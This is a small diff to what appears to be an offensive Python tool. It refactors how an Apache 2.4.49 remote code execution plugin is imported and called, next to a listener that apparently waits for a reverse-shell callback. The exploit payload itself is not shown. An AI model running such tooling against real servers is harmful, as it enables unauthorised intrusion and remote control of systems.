@@ -5,7 +5,7 @@ import socket
 from multiprocessing import Process
 import rs_client
 import sys
-from plugins.initial_access import *
+from plugins import initial_access
 
 def listener(listener_port, listener_address):
     print('listener_address :' + listener_address)
@@ -15,7 +15,7 @@ def listener(listener_port, listener_address):
 def exploit(target_ip, target_port, local_ip, local_port):
     try:
         print('[+] Running exploit')
-        res = plugin_initial_access_apache2_4_49_RCE.exploit(target_ip, target_port, local_ip, local_port)
+        res = initial_access.apache2_4_49_RCE.exploit(target_ip, target_port, local_ip, local_port)
         if res is True:
             print('[+] Exploit was successful !')
     except Exception as e:
